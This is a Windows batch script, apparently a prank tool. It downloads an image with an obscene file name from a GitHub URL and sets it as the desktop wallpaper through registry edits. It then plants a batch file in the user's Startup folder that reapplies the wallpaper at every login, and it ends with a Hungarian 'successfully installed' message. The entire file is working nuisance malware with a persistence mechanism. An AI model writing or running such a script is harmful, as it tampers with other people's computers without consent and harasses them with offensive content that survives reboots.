@echo off
C:
mkdir %appdata%\kakas
cd %appdata%\kakas
curl https://raw.githubusercontent.com/Sandormate0513/UltimateKakasScript/refs/heads/main/BlackCock.png -o BlackCock.png
reg add "HKCU\control panel\desktop" /v wallpaper /t REG_SZ /d %appdata%\kakas\BlackCock.png /f 
reg add "HKCU\control panel\desktop" /v WallpaperStyle /t REG_SZ /d 2 /f 
RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters 1, True
cd %appdata%\Microsoft\Windows\Start Menu\Programs\Startup
echo @echo off > kakasextension.bat
echo reg add "HKCU\control panel\desktop" /v wallpaper /t REG_SZ /d %appdata%\kakas\BlackCock.png /f >> kakasextension.bat
echo reg add "HKCU\control panel\desktop" /v WallpaperStyle /t REG_SZ /d 2 /f >> kakasextension.bat
echo RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters 1, True >> kakasextension.bat
cls
@echo on
echo Kakas sikeresen települt!
timeout /t 5
exit
